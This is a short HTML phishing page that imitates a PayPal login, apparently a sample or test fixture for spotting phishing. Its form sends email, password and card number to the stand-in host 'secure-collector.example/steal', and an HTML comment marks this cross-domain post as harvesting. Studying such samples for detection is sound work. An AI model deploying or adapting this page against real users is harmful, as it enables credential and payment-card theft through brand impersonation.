<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>PayPal - Log In to Your Account</title>
  </head>
  <body style="font-family: Arial, sans-serif; text-align:center; padding:40px;">
    <h1>PayPal</h1>
    <p>Your account has been limited. Log in to restore access.</p>
    <!-- Credentials POST to a DIFFERENT domain than the page = harvesting -->
    <form action="https://secure-collector.example/steal" method="post">
      <input type="email" name="email" placeholder="Email" /><br /><br />
      <input type="password" name="password" placeholder="Password" /><br /><br />
      <input type="text" name="cc-number" placeholder="Card number" autocomplete="cc-number" /><br /><br />
      <button type="submit">Log In</button>
    </form>
  </body>
</html>
